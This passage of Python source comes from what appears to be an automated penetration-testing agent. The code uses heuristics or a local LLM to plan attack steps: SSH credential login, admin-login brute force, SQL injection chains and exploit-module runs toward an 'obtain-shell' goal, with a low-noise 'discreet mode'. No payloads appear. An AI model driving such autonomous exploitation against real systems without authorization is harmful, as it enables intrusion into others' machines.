                state.decision_source = "heuristic"
                return state

        if state.campaign_goal == CAMPAIGN_GOAL_SHELL_STOP:
            state.llm_plan = {
                "selected_paths": [],
                "rationale": "Strategic stop: shell or interactive session milestone.",
                "next_best_action": self._next_best_action_for_goal(state, decision_findings),
            }
            state.execution_plan = {
                "next_actions": [],
                "max_requests_next_phase": 0,
                "stop_conditions": ["shell_obtained"],
                "reasoning_confidence": 1.0,
                "skip_exploitation": True,
                "campaign_goal": state.campaign_goal,
            }
            state.decision_source = "heuristic"
            self._append_timeline_event(
                state,
                "reason",
                "Strategic stop: shell milestone already reached.",
                kind="decision",
                extra={"goal": state.campaign_goal},
            )
            self._log_strategic_next_action(state)
            return state

        if not vulnerable_results:
            if is_shell_operator_goal(state.campaign_goal) and kb_ssh_surface_ready(knowledge_base, state):
                ssh_login = "auxiliary/scanner/ssh/ssh_login"
                if not self._module_block_reason_for_profile(state, ssh_login):
                    state.llm_plan = {
                        "selected_paths": [ssh_login],
                        "rationale": "SSH surface detected — attempt credential login toward shell.",
                        "next_best_action": {
                            "type": "run_followup",
                            "path": ssh_login,
                            "reason": "Goal obtain-shell: SSH authentication surface.",
                        },
                    }
                    state.execution_plan = {
                        "next_actions": [{
                            "type": "run_followup",
                            "path": ssh_login,
                            "priority": 1,
                            "reason": "Goal obtain-shell: SSH authentication surface.",
                        }],
                        "max_requests_next_phase": max(12, int(state.request_budget or 0) // 4 or 12),
                        "stop_conditions": ["shell_obtained"],
                        "reasoning_confidence": 0.72,
                        "skip_exploitation": False,
                        "campaign_goal": state.campaign_goal,
                    }
                    state.decision_source = "heuristic"
                    self._append_timeline_event(
                        state,
                        "reason",
                        "SSH surface ready — queued ssh_login for obtain-shell.",
                        kind="decision",
                        extra={"goal": state.campaign_goal, "path": ssh_login},
                    )
                    return state
            state.llm_plan = {
                "selected_paths": [],
                "rationale": "No vulnerabilities to prioritize.",
                "next_best_action": None,
            }
            state.execution_plan = {
                "next_actions": [],
                "max_requests_next_phase": 0,
                "stop_conditions": ["no_vulnerabilities"],
                "reasoning_confidence": 1.0,
                "skip_exploitation": True,
            }
            self._append_timeline_event(
                state,
                "reason",
                "No actionable vulnerabilities available for prioritization.",
                kind="decision",
                extra={"goal": state.campaign_goal},
            )
            return state

        complexity = self._get_complexity_details(vulnerable_results)
        force_strategic_llm = should_force_strategic_llm(
            state,
            knowledge_base,
            complexity,
            findings=decision_findings,
        )
        if state.llm_local and int(getattr(state, "llm_budget", 0) or 0) <= 0:
            state.llm_budget = resolve_effective_llm_budget(state)
        decision_classes = {
            self._finding_decision_class(f) for f in decision_findings if isinstance(f, dict)
        }
        validation_only = bool(decision_findings) and decision_classes <= {"info"}
        if state.verbose:
            self._print_reasoning_context(state, complexity)

        if validation_only:
            state.metrics.deterministic_steps += 1
            state.llm_plan = self._heuristic_plan(
                decision_findings, "Heuristic validation plan (informational findings only).", state=state,
            )
            state.execution_plan = self._build_heuristic_execution_plan(state, decision_findings)
            state.llm_plan["next_best_action"] = self._resolve_next_best_action(
                state, decision_findings, execution_plan=state.execution_plan,
            )
            state.decision_source = "heuristic"
            self._print_decision_summary(state)
            self._append_timeline_event(
                state,
                "reason",
                "Informational findings only; using deterministic validation plan.",
                kind="decision",
                extra={"goal": state.campaign_goal, "source": state.decision_source},
            )
            return state

        # Deterministic-first: if the decision is simple, keep it rule-based.
        if not complexity["is_complex"] and not state.llm_local and not force_strategic_llm:
            state.metrics.deterministic_steps += 1
            state.llm_plan = self._heuristic_plan(
                decision_findings, "Heuristic plan (simple case).", state=state,
            )
            state.execution_plan = self._build_heuristic_execution_plan(state, decision_findings)
            self._enrich_execution_plan_with_playbook(state, decision_findings)
            state.llm_plan["next_best_action"] = self._resolve_next_best_action(
                state, decision_findings, execution_plan=state.execution_plan,
            )
            state.decision_source = "heuristic"
            self._print_decision_summary(state)
            self._append_timeline_event(
                state,
                "reason",
                "Heuristic planner selected next actions (simple case).",
                kind="decision",
                extra={"goal": state.campaign_goal, "source": state.decision_source},
            )
            if state.verbose:
                print_info("Decision source: heuristic (simple case, LLM skipped).")
            self._log_strategic_next_action(state)
            return state

        if not state.llm_local and not force_strategic_llm:
            state.metrics.deterministic_steps += 1
            state.llm_plan = self._heuristic_plan(
                decision_findings, "Heuristic plan (LLM disabled).", state=state,
            )
            state.execution_plan = self._build_heuristic_execution_plan(state, decision_findings)
            state.llm_plan["next_best_action"] = self._resolve_next_best_action(
                state, decision_findings, execution_plan=state.execution_plan,
            )
            state.decision_source = "heuristic"
            self._print_decision_summary(state)
            self._append_timeline_event(
                state,
                "reason",
                "Heuristic planner selected next actions (LLM disabled).",
                kind="decision",
                extra={"goal": state.campaign_goal, "source": state.decision_source},
            )
            if state.verbose:
                print_info("Decision source: heuristic (complex case, LLM disabled).")
            self._log_strategic_next_action(state)
            return state

        if llm_budget_exhausted(state):
            state.metrics.llm_fallback_count += 1
            state.llm_plan = self._heuristic_plan(
                decision_findings,
                "Heuristic plan (LLM budget reached).",
                state=state,
            )
            state.execution_plan = self._build_heuristic_execution_plan(state, decision_findings)
            state.llm_plan["next_best_action"] = self._resolve_next_best_action(
                state, decision_findings, execution_plan=state.execution_plan,
            )
            state.decision_source = "heuristic"
            self._print_decision_summary(state)
            self._append_timeline_event(
                state,
                "reason",
                "LLM budget reached; heuristic planner fallback applied.",
                kind="decision",
                extra={"goal": state.campaign_goal, "source": state.decision_source},
            )
            return state

        print_status("Reasoning with local LLM...")
        redirect_observation = self._collect_redirect_observation(state)
        risk_signals_list = knowledge_base.get("risk_signals", []) or []
        auth_session = "authenticated_session" in [str(x).lower() for x in risk_signals_list]
        auth_context = self._get_active_auth_context(knowledge_base)
        auth_first = self._auth_first_mode(state)
        compressed_context = self._refresh_compressed_context_summary(state)
        request_intel = (
            knowledge_base.get("request_intel", {})
            if isinstance(knowledge_base.get("request_intel", {}), dict)
            else {}
        )
        strategic_context = strategic_llm_context(
            state,
            knowledge_base,
            complexity,
            findings=decision_findings,
        )
        try:
            from interfaces.command_system.builtin.agent.vuln_specialists import collect_specialist_hints

            specialist_hints = collect_specialist_hints(
                decision_findings,
                max_hints=3,
            )
        except Exception:
            specialist_hints = []
        packed_knowledge = strategic_context.get("packed_knowledge") or {}
        prompt_payload = build_reason_prompt_payload(
            raw_target=state.raw_target,
            campaign_goal=state.campaign_goal or "",
            auth_first=auth_first,
            strategic_context=strategic_context,
            packed_knowledge=packed_knowledge,
            specialist_hints=specialist_hints,
            compressed_context=compressed_context,
            knowledge_base=knowledge_base,
            redirect_observation=redirect_observation,
            auth_session=auth_session,
            auth_context=auth_context,
            potential_findings=state.potential_findings,
            decision_findings=decision_findings,
            strategic_instruction_extension=strategic_llm_instruction_extension(strategic_context),
        )

        llm_model = resolve_llm_model(state)
        cache_hit = {"value": False}

        def _mark_cache_hit() -> None:
            cache_hit["value"] = True

        llm_response = self._planner.query_agent_reason(
            endpoint=state.llm_endpoint,
            model=llm_model,
            payload=prompt_payload,
            timeout=25,
            goal=str(state.campaign_goal or ""),
            strategic=bool(strategic_context.get("strategic_triggers")),
            on_cache_hit=_mark_cache_hit,
        )
        if not cache_hit["value"]:
            state.metrics.llm_calls += 1

        if not llm_response:
            detail = str(getattr(self._llm, "last_error", "") or "").strip()
            print_warning(
                "Local LLM unavailable, using heuristic prioritization "
                f"(endpoint={state.llm_endpoint}, model={llm_model}"
                f"{'; ' + detail if detail else ''})."
            )
            state.metrics.llm_fallback_count += 1
            state.llm_plan = self._heuristic_plan(
                decision_findings, "Heuristic plan (LLM request failed).", state=state,
            )
            state.execution_plan = self._build_heuristic_execution_plan(state, decision_findings)
            state.llm_plan["next_best_action"] = self._resolve_next_best_action(
                state, decision_findings, execution_plan=state.execution_plan,
            )
            state.decision_source = "heuristic"
            self._print_decision_summary(state)
            self._append_timeline_event(
                state,
                "reason",
                "LLM unavailable; heuristic planner fallback applied.",
                kind="decision",
                extra={"goal": state.campaign_goal, "source": state.decision_source},
            )
            if state.verbose:
                print_info("Decision source: heuristic (LLM failure fallback).")
            self._log_strategic_next_action(state)
            return state

        selected_paths = llm_response.get("selected_paths", [])
        if not isinstance(selected_paths, list):
            selected_paths = []

        state.llm_plan = {
            "selected_paths": [p for p in selected_paths if isinstance(p, str) and p.strip()],
            "rationale": str(llm_response.get("rationale", "LLM plan generated.")),
        }
        state.execution_plan = self._sanitize_execution_plan(
            llm_response,
            state,
            decision_findings,
        )
        state.execution_plan = self._apply_auth_first_execution_overrides(
            state, state.execution_plan, decision_findings,
        )
        self._enrich_execution_plan_with_playbook(state, decision_findings)
        state.llm_plan["next_best_action"] = self._resolve_next_best_action(
            state, decision_findings, execution_plan=state.execution_plan,
        )
        if (
            not state.llm_plan.get("selected_paths")
            and not state.execution_plan.get("next_actions")
        ):
            state.metrics.llm_fallback_count += 1
            state.llm_plan = self._heuristic_plan(
                decision_findings,
                "Heuristic plan (LLM returned no actionable selection).",
                state=state,
            )
            state.execution_plan = self._build_heuristic_execution_plan(state, decision_findings)
            state.llm_plan["next_best_action"] = self._resolve_next_best_action(
                state, decision_findings, execution_plan=state.execution_plan,
            )
            state.decision_source = "heuristic"
            self._print_decision_summary(state)
            self._append_timeline_event(
                state,
                "reason",
                "LLM returned no actionable selection; heuristic planner fallback applied.",
                kind="decision",
                extra={"goal": state.campaign_goal, "source": state.decision_source},
            )
            if state.verbose:
                print_info("Decision source: heuristic (LLM returned empty plan).")
            self._log_strategic_next_action(state)
            return state
        state.decision_source = "llm_local"
        self._print_decision_summary(state)
        self._append_timeline_event(
            state,
            "reason",
            "Local LLM produced the execution plan.",
            kind="decision",
            extra={"goal": state.campaign_goal, "source": state.decision_source},
        )
        if state.verbose:
            print_info("Decision source: local LLM (complex case).")
        self._log_strategic_next_action(state)
        return state

    def _is_complex_decision(self, vulnerable_results) -> bool:
        """
        Decide when LLM reasoning is worth the cost/latency.
        """
        vuln_count = len(vulnerable_results)
        if vuln_count >= 4:
            return True

        families = set()
        with_exploit = 0
        without_exploit = 0
        severities = set()

        for item in vulnerable_results:
            path = str(item.get("path", ""))
            parts = path.split("/")
            if len(parts) >= 2:
                families.add(parts[1])  # scanner family like http/cloud/ldap

            if item.get("exploit_module"):
                with_exploit += 1
            else:
                without_exploit += 1

            sev = str(item.get("severity", "")).strip().lower()
            if sev:
                severities.add(sev)

        # Multiple protocols/families means branching strategy.
        if len(families) >= 2:
            return True

        # Mixed exploitability often requires trade-off decisions.
        if with_exploit > 0 and without_exploit > 0:
            return True

        # Conflicting severity labels can benefit from model arbitration.
        if len(severities) >= 2:
            return True

        return False

    def _get_complexity_details(self, vulnerable_results) -> Dict[str, Any]:
        vuln_count = len(vulnerable_results)
        families = set()
        with_exploit = 0
        without_exploit = 0
        severities = set()

        for item in vulnerable_results:
            path = str(item.get("path", ""))
            parts = path.split("/")
            if len(parts) >= 2:
                families.add(parts[1])

            if item.get("exploit_module"):
                with_exploit += 1
            else:
                without_exploit += 1

            sev = str(item.get("severity", "")).strip().lower()
            if sev:
                severities.add(sev)

        reasons = []
        if vuln_count >= 4:
            reasons.append("many_findings")
        if len(families) >= 2:
            reasons.append("multi_families")
        if with_exploit > 0 and without_exploit > 0:
            reasons.append("mixed_exploitability")
        if len(severities) >= 2:
            reasons.append("mixed_severity")

        return {
            "is_complex": bool(reasons),
            "reasons": reasons,
            "vuln_count": vuln_count,
            "families": sorted(families),
            "with_exploit": with_exploit,
            "without_exploit": without_exploit,
            "severities": sorted(severities),
        }

    def _print_reasoning_context(self, state: AgentState, complexity: Dict[str, Any]) -> None:
        print_info("Reasoning context:")
        print_info(f"- Findings count: {complexity['vuln_count']}")
        print_info(f"- Families: {', '.join(complexity['families']) if complexity['families'] else 'none'}")
        print_info(
            f"- Exploitable vs non-exploitable: "
            f"{complexity['with_exploit']} / {complexity['without_exploit']}"
        )
        print_info(f"- Severity labels: {', '.join(complexity['severities']) if complexity['severities'] else 'none'}")
        if complexity["is_complex"]:
            print_info(f"- Decision complexity: complex ({', '.join(complexity['reasons'])})")
            if state.llm_local:
                print_info("- Plan mode: local LLM enabled")
            else:
                print_info("- Plan mode: deterministic only (LLM disabled)")
        else:
            print_info("- Decision complexity: simple")

    def _heuristic_plan(
        self,
        vulnerable_results,
        rationale: str,
        state: Optional[AgentState] = None,
    ) -> Dict[str, Any]:
        """
        Fast deterministic prioritization:
        1) entries with exploit module
        2) severity weight
        3) preserve scanner discovery order
        AUTH-FIRST: boost login-surface findings; demote generic recon modules (headers, spa, etc.).
        """
        severity_weight = {
            "critical": 4,
            "high": 3,
            "medium": 2,
            "low": 1,
        }
        decision_weight = {
            "exploit": 120,
            "followup": 55,
            "info": 0,
        }

        auth_first = bool(state and self._auth_first_mode(state))
        scored = []
        for idx, item in enumerate(vulnerable_results):
            has_exploit = 1 if item.get("exploit_module") else 0
            sev = str(item.get("severity", "")).strip().lower()
            sev_score = severity_weight.get(sev, 0)
            context_score = int(item.get("context_score", 0)) if isinstance(item, dict) else 0
            decision_class = self._finding_decision_class(item if isinstance(item, dict) else {})
            goal_bonus = 0
            if auth_first and isinstance(item, dict):
                path_l = str(item.get("path", "") or "").lower()
                if any(
                    t in path_l
                    for t in (
                        "login",
                        "admin_panel",
                        "simple_login",
                        "login_page",
                        "admin_login",
                    )
                ):
                    goal_bonus += 80
                if any(sub in path_l for sub in AUTH_FIRST_DEPRIORITIZE_SUBSTRINGS):
                    goal_bonus -= 60
            scored.append((
                decision_weight.get(decision_class, 0) + context_score + goal_bonus,
                has_exploit,
                sev_score,
                -idx,
                item,
            ))

        scored.sort(reverse=True)
        selected_paths = []
        for _, _, _, _, item in scored[:5]:
            path = item.get("path")
            if path:
                selected_paths.append(path)

        plan = {
            "selected_paths": selected_paths,
            "rationale": rationale,
        }
        if state is not None:
            plan["next_best_action"] = self._next_best_action_for_goal(state, vulnerable_results)
        else:
            plan["next_best_action"] = None
        return plan

    def _build_heuristic_execution_plan(self, state: AgentState, findings):
        selected_paths = state.llm_plan.get("selected_paths", [])
        if not selected_paths:
            selected_paths = [f.get("path") for f in findings[:3] if f.get("path")]
        allow_paths = set([str(f.get("path", "")) for f in findings if f.get("path")])
        potential_findings = state.potential_findings
        knowledge_base = state.knowledge_base
        auth_session = self._has_authenticated_session(knowledge_base)
        auth_surface = self._should_prioritize_auth_surface(knowledge_base)
        cms_lock = self._get_cms_lock_specializations(
            knowledge_base,
            state.scan_specializations,
        ).union(self._get_probable_cms_specializations(knowledge_base))
        max_requests = min(8, max(2, len(selected_paths) + 1))
        if self._has_exploit_pressure(state):
            max_requests = max(max_requests, 12)
        if is_shell_operator_goal(self._operator_campaign_goal(state)):
            max_requests = max(max_requests, 18)
        if auth_session:
            max_requests = min(10, max_requests + 2)
        elif auth_surface or cms_lock:
            # Enough budget for login bruteforce plus a couple of chained scanners (4 was too tight).
            max_requests = min(max_requests, 8)
        if self._discreet_mode(state):
            if auth_session:
                max_requests = min(max_requests, 5)
            elif auth_surface or cms_lock:
                max_requests = min(max_requests, 4)
            else:
                max_requests = min(max_requests, 3)
        actions = []
        for idx, path in enumerate(selected_paths[:5], start=1):
            if path in allow_paths:
                actions.append({"type": "prioritize", "path": path, "priority": idx, "options": {}})

        # Confirmed / high-priority SQLi must beat OSINT and login spray.
        sqli_action = self._suggest_sqli_chain_action(state, knowledge_base)
        if sqli_action and sqli_action.get("path"):
            path = str(sqli_action["path"])
            actions = [a for a in actions if isinstance(a, dict) and a.get("path") != path]
            actions.insert(0, {
                "type": sqli_action.get("type", "run_followup"),
                "path": path,
                "priority": 0,
                "options": sqli_action.get("options") or {},
                "reason": sqli_action.get("reason"),
                "resume_branch": bool(sqli_action.get("resume_branch")),
            })
            max_requests = max(max_requests, 12)

        bf_path = "auxiliary/scanner/http/login/admin_login_bruteforce"
        if self._login_surface_wants_bruteforce(knowledge_base, findings, auth_session):
            if not any(a.get("path") == bf_path for a in actions):
                actions.append({
                    "type": "run_followup",
                    "path": bf_path,
                    "priority": len(actions) + 1,
                    "options": {},
                })

        # Chain scanner-advertised follow-ups (e.g. admin_panel_detect -> admin_login_bruteforce)
        # for any vulnerable finding, not only when the parent path is in the top-N selected_paths.
        linked_followups = []
        for finding in findings[:16]:
            if not finding.get("vulnerable"):
                continue
            for linked_path in self._catalog.normalize_linked_module_paths(finding.get("linked_modules")):
                linked_followups.append(linked_path)

        prioritized_findings = [
            finding for finding in findings
            if str(finding.get("path", "")) in selected_paths
        ]
        has_grounded_priority = any(
            self._catalog.normalize_exploit_module_path(item.get("exploit_module"))
            or self._is_weaponizable_vuln_finding(item)
            or (
                isinstance(item.get("details", {}), dict)
                and (
                    item.get("details", {}).get("authenticated_as")
                    or item.get("details", {}).get("post_login_snippet")
                    or item.get("details", {}).get("post_login_final_url")
                )
            )
            or any(token in str(item.get("path", "")).lower() for token in (
                "admin_panel_detect",
                "simple_login_scanner",
                "login_page_detector",
                "admin_login_bruteforce",
            ))
            for item in prioritized_findings
        )

        # Redirect-first heuristic: if root is redirected and discovery is weak,
        # prioritize following redirect/login discovery before broad verification.
        redirect_followups = []
        if not cms_lock:
            redirect_followups = self._suggest_redirect_followups(state)
        base_priority = len(actions) + 1
        for offset, path in enumerate(redirect_followups, start=0):
            actions.append({
                "type": "run_followup",
                "path": path,
                "priority": base_priority + offset,
                "options": {},
            })
        if auth_surface and not auth_session:
            max_requests = min(max(10, max_requests), 12)

        # Do not bury confirmed injection findings under SPA/OSINT follow-ups.
        if not self._has_weaponizable_campaign_pressure(state) and (
            kb_client_js_surface_ready(knowledge_base)
            or self._has_nextjs_evidence(knowledge_base)
            or any(
                self._has_tech_evidence(knowledge_base, tech, threshold=0.65)
                for tech in ("react", "nodejs", "javascript")
            )
        ):
            base_priority = len(actions) + 1
            for offset, path in enumerate(CLIENT_JS_INTEL_MODULES):
                if any(a.get("path") == path for a in actions):
                    continue
                actions.append({
                    "type": "run_followup",
                    "path": path,
                    "priority": base_priority + offset,
                    "options": {},
                })
            max_requests = min(16, max(max_requests, 8))

        if is_shell_operator_goal(self._operator_campaign_goal(state)):
            base_priority = len(actions) + 1
            for offset, path in enumerate(
                suggest_shell_plan_followups(
                    knowledge_base,
                    state,
                    self._catalog.discover_campaign_modules(expanded=True),
                )
            ):
                if any(a.get("path") == path for a in actions):
                    continue
                action_type = "run_exploit" if path.startswith(("exploit/", "exploits/")) else "run_followup"
                actions.append({
                    "type": action_type,
                    "path": path,
                    "priority": base_priority + offset,
                    "options": {},
                })

        base_priority = len(actions) + 1
        for offset, path in enumerate(linked_followups, start=0):
            if any(a.get("path") == path for a in actions):
                continue
            action_type = "run_exploit" if path.startswith(("exploit/", "exploits/")) else "run_followup"
            actions.append({
                "type": action_type,
                "path": path,
                "priority": base_priority + offset,
                "options": {},
            })

        inferred_exploits = self._derive_exploit_paths_from_findings(findings, knowledge_base, limit=4)
        if inferred_exploits:
            existing_paths = {str(a.get("path", "")).strip() for a in actions if isinstance(a, dict)}
            inferred_rows = []
            for path in inferred_exploits:
                if not path or path in existing_paths:
                    continue
                inferred_rows.append({
                    "type": "run_exploit",
                    "path": path,
                    "priority": 0,
                    "options": {},
                })
            if inferred_rows:
                actions = inferred_rows + actions

        post_auth_actions = self._suggest_post_auth_methodical_actions(state, knowledge_base, max_actions=6)
        if auth_session:
            base_priority = len(actions) + 1
            for offset, row in enumerate(post_auth_actions):
                path = row.get("path")
                if not path or any(a.get("path") == path for a in actions):
                    continue
                actions.append({
                    "type": row.get("type", "run_followup"),
                    "path": path,
                    "priority": base_priority + offset,
                    "options": row.get("options") or {},
                })
            if post_auth_actions:
                max_requests = min(28, max_requests + 6)

        # Heuristic manual verification follow-ups for "potential" findings.
        verification_candidates = self._suggest_verification_followups(
            potential_findings,
            knowledge_base,
            max_actions=4,
        )
        if not has_grounded_priority and not auth_surface:
            base_priority = len(actions) + 1
            for offset, path in enumerate(verification_candidates, start=0):
                if any(a.get("path") == path for a in actions):
                    continue
                actions.append({
                    "type": "run_followup",
                    "path": path,
                    "priority": base_priority + offset,
                    "options": {},
                })

        if not auth_session:
            base_priority = len(actions) + 1
            for offset, row in enumerate(post_auth_actions):
                path = row.get("path")
                if not path or any(a.get("path") == path for a in actions):
                    continue
                actions.append({
                    "type": row.get("type", "run_followup"),
                    "path": path,
                    "priority": base_priority + offset,
                    "options": row.get("options") or {},
                })
            if post_auth_actions:
                max_requests = min(28, max_requests + 6)

        actions = self._filter_previously_failed_plan_actions(actions, knowledge_base)
        actions = self._filter_plan_actions_by_protocol(state, actions)
        for idx, row in enumerate(actions, start=1):
            row["priority"] = idx

        stop_conditions = []
        if not self._has_exploit_pressure(state):
            stop_conditions = ["stop_if_no_exploit_path"]
        plan = {
            "next_actions": actions,
            "max_requests_next_phase": max_requests,
            "stop_conditions": stop_conditions,
            "reasoning_confidence": 0.6,
            "skip_exploitation": False,
        }
        plan = self._apply_auth_first_execution_overrides(state, plan, findings)
        self._enrich_execution_plan_with_playbook(state, findings, plan)
        # Playbooks may reintroduce foreign-protocol steps; re-apply the operator constraint.
        if isinstance(plan, dict) and isinstance(plan.get("next_actions"), list):
            plan["next_actions"] = self._filter_plan_actions_by_protocol(
                state, list(plan.get("next_actions") or [])
            )
            for idx, row in enumerate(plan["next_actions"], start=1):
                if isinstance(row, dict):
                    row["priority"] = idx
        return plan

    def _filter_plan_actions_by_protocol(
        self,
        state: AgentState,
        actions: List[Dict[str, Any]],
    ) -> List[Dict[str, Any]]:
        """Drop planned modules that conflict with an explicit ``--protocol`` constraint."""
        protocol = str(getattr(state, "protocol", "") or "").strip().lower()
        if not protocol:
            kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
            protocol = str(kb.get("protocol") or "").strip().lower()
        if not protocol:
            return actions
        filtered: List[Dict[str, Any]] = []
        for row in actions or []:
            if not isinstance(row, dict):
                continue
            path = str(row.get("path", "") or "").strip()
            if path and not path_matches_forced_protocol(path, protocol):
                continue
            filtered.append(row)
        return filtered

    def _enrich_execution_plan_with_playbook(
        self,
        state: AgentState,
        findings,
        plan: Optional[Dict[str, Any]] = None,
    ) -> None:
        """Merge reachable playbook next steps into the active execution plan."""
        if state.dry_run or state.plan_only or state.no_exploit:
            return
        if plan is None:
            plan = state.execution_plan if isinstance(state.execution_plan, dict) else None
        if not isinstance(plan, dict):
            return
        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        snapshot = kb.get("campaign_findings_snapshot") or findings or []
        playbook_plan = build_playbook_execution_plan(kb, snapshot, max_steps=2)
        if not playbook_plan:
            return
        merge_playbook_into_execution_plan(plan, playbook_plan)
        if plan is not state.execution_plan:
            state.execution_plan = plan
        if state.verbose:
            print_info(
                "Playbook executor: merged "
                f"{playbook_plan.get('playbook_id')} "
                f"({playbook_plan.get('playbook_coverage')}) "
                f"with {len(playbook_plan.get('next_actions') or [])} step(s)."
            )
        self._append_timeline_event(
            state,
            "reason",
            (
                f"Playbook chain armed: {playbook_plan.get('playbook_name')} "
                f"[{playbook_plan.get('playbook_id')}]"
            ),
            kind="decision",
            extra={
                "playbook_id": playbook_plan.get("playbook_id"),
                "coverage": playbook_plan.get("playbook_coverage"),
            },
        )

    def _suggest_redirect_followups(self, state: AgentState, max_actions=3):
        kb = state.knowledge_base
        signals = set([str(s).lower() for s in kb.get("risk_signals", [])])
        endpoint_count = len(kb.get("discovered_endpoints", []))
        redirect_obs = self._collect_redirect_observation(state)

        root_status = int(redirect_obs.get("root_status") or 0)
        redirect_heavy = root_status in HTTP_REDIRECT_STATUSES or "http_status_302" in signals
        low_discovery = endpoint_count <= 1 or bool(redirect_obs.get("low_discovery"))

        if not (redirect_heavy and low_discovery):
            return []

        candidates = [
            "auxiliary/scanner/http/login/admin_login_bruteforce",
            "auxiliary/scanner/http/login_page_detector",
        ]
        return candidates[:max_actions]

    def _suggest_verification_followups(self, potential_findings, knowledge_base, max_actions=4):
        candidates = []
        hints = set([str(x).lower() for x in knowledge_base.get("tech_hints", [])])
        risk_signals = set([str(x).lower() for x in knowledge_base.get("risk_signals", [])])
        cms_lock = self._get_cms_lock_specializations(knowledge_base, hints)
        madara_link_present = any(
            "wordpress_madara_cve_2025_4524" in linked_path
            for finding in potential_findings
            for linked_path in self._catalog.normalize_linked_module_paths(finding.get("linked_modules"))
        )
        madara_positive = any(
            "scanner/http/wordpress_madara_cve_2025_4524" in str(finding.get("path", "")).lower()
            and finding.get("vulnerable")
            for finding in potential_findings
        )
        for finding in potential_findings:
            blob = " ".join([
                str(finding.get("path", "")),
                str(finding.get("module", "")),
                str(finding.get("message", "")),
            ]).lower()
            if "xxe" in blob and not cms_lock:
                candidates.append("auxiliary/scanner/http/xxe_scanner")
            if ("sql" in blob or "sqli" in blob) and not cms_lock:
                candidates.append(HTTP_SQLI_SCANNER_MODULE)
                if "sqli_confirmed" in risk_signals or "vulnerability_detected" in risk_signals:
                    candidates.append(HTTP_SQLI_POST_MODULE)
            if "xss" in blob and not cms_lock:
                candidates.append("auxiliary/scanner/http/xss_scanner")
            if "lfi" in blob and not cms_lock:
                candidates.append("auxiliary/scanner/http/lfi_fuzzer")
            if "ssrf" in blob and not cms_lock:
                candidates.append("auxiliary/scanner/http/ssrf_scanner")
            if (
                ("api" in blob or "swagger" in blob or "graphql" in blob)
                and not cms_lock
                and (
                    self._has_tech_evidence(knowledge_base, "api", threshold=0.65)
                    or any(
                        token in str(endpoint).lower()
                        for endpoint in knowledge_base.get("discovered_endpoints", [])
                        for token in ("/api", "swagger", "graphql")
                    )
                )
            ):
                candidates.append("auxiliary/scanner/http/api_fuzzer")

        if "wordpress" in hints and self._has_tech_evidence(knowledge_base, "wordpress", threshold=0.65):
            candidates.extend([
                "auxiliary/scanner/http/wp_plugin_scanner",
                "auxiliary/scanner/http/wordpress_enum_user",
                "scanner/http/wordpress_detect",
            ])
            if (
                self._has_tech_evidence(knowledge_base, "wordpress", threshold=0.8)
                and (madara_link_present or madara_positive)
            ):
                candidates.append("auxiliary/scanner/http/wordpress_madara_cve_2025_4524_lfi")
        if "drupal" in hints and self._has_tech_evidence(knowledge_base, "drupal", threshold=0.65):
            candidates.append("auxiliary/scanner/http/drupal_scanner")
        if "joomla" in hints and self._has_tech_evidence(knowledge_base, "joomla", threshold=0.65):
            candidates.append("auxiliary/scanner/http/joomla_scanner")
        if "dom_xss_signal" in risk_signals and not cms_lock:
            candidates.extend([
                "auxiliary/scanner/http/xss_scanner",
                "auxiliary/scanner/http/react_xss",
                "auxiliary/scanner/http/angular_xss",
            ])
        if kb_client_js_surface_ready(knowledge_base) or self._has_nextjs_evidence(knowledge_base) or any(
            h in hints for h in ("nextjs", "react", "nodejs", "javascript")
        ):
            candidates.extend(CLIENT_JS_INTEL_MODULES)
            if "api_surface_detected" in risk_signals or "graphql_surface_detected" in risk_signals or any(
                "/api" in str(endpoint).lower() or "graphql" in str(endpoint).lower()
                for endpoint in knowledge_base.get("discovered_endpoints", [])
            ):
                candidates.append("scanner/http/graphql_detect")
                candidates.append("scanner/http/swagger_detect")

        # Hard safety: if CMS lock is active, drop generic fuzzing modules from
        # follow-up verification actions even if suggested by model/heuristics.
        if cms_lock:
            candidates = [
                path for path in candidates
                if path and not any(token in path for token in (
                    "xss_scanner", "sql_injection", "lfi_fuzzer", "ssrf_scanner", "xxe_scanner", "api_fuzzer"
                ))
            ]

        unique = []
        seen = set()
        for path in candidates:
            if path in seen:
                continue
            unique.append(path)
            seen.add(path)
            if len(unique) >= max_actions:
                break
        return unique

    def _sanitize_execution_plan(self, llm_response, state: AgentState, findings):
        allowed_paths = set([str(f.get("path", "")) for f in findings if f.get("path")])
        allowed_paths |= set([
            self._catalog.normalize_exploit_module_path(f.get("exploit_module"))
            for f in findings
            if self._catalog.normalize_exploit_module_path(f.get("exploit_module"))
        ])
        for finding in findings:
            for linked_path in self._catalog.normalize_linked_module_paths(finding.get("linked_modules")):
                allowed_paths.add(linked_path)
        kb = state.knowledge_base
        observed = set([str(p) for p in kb.get("observed_modules", [])])
        allowed_paths |= observed
        catalog_paths = set([str(p) for p in kb.get("module_capability_catalog", {}).get("all_paths", [])])
        allowed_paths |= catalog_paths

        raw_actions = llm_response.get("next_actions", [])
        actions = []
        if isinstance(raw_actions, list):
            for row in raw_actions[:15]:
                if not isinstance(row, dict):
                    continue
                action_type = str(row.get("type", "")).strip().lower()
                path = str(row.get("path", "")).strip()
                priority = int(row.get("priority", 999)) if str(row.get("priority", "")).isdigit() else 999
                if action_type not in SAFE_FOLLOWUP_ACTION_TYPES:
                    continue
                if action_type == "http_request":
                    options = self._sanitize_http_request_action_options(row.get("options", {}))
                    if not path or not self._build_agent_http_request_url(state, path):
                        continue
                    actions.append({
                        "type": action_type,
                        "path": path[:512],
                        "priority": priority,
                        "options": options,
                    })
                    continue
                if action_type == "surface_scan":
                    options = self._sanitize_surface_scan_action_options(row.get("options", {}))
                    actions.append({
                        "type": action_type,
                        "path": path[:256] or "scanner -u",
                        "priority": priority,
                        "options": options,
                    })
                    continue
                if not path or path not in allowed_paths:
                    continue
                if action_type == "run_exploit" and not path.startswith(("exploit/", "exploits/")):
                    action_type = "run_followup"
                if not path_matches_forced_protocol(path, str(getattr(state, "protocol", "") or "")):
                    continue
                options = self._sanitize_action_options(row.get("options", {}))
                actions.append({
                    "type": action_type,
                    "path": path,
                    "priority": priority,
                    "options": options,
                })
        actions.sort(key=lambda a: a.get("priority", 999))
        actions = self._filter_previously_failed_plan_actions(actions, state.knowledge_base)
        for idx, row in enumerate(actions, start=1):
            row["priority"] = idx

        max_requests_raw = llm_response.get("max_requests_next_phase", 10)
        try:
            max_requests = int(max_requests_raw)
        except Exception:
            max_requests = 10
        kb = state.knowledge_base
        cms_lock = self._get_cms_lock_specializations(
            kb,
            state.scan_specializations,
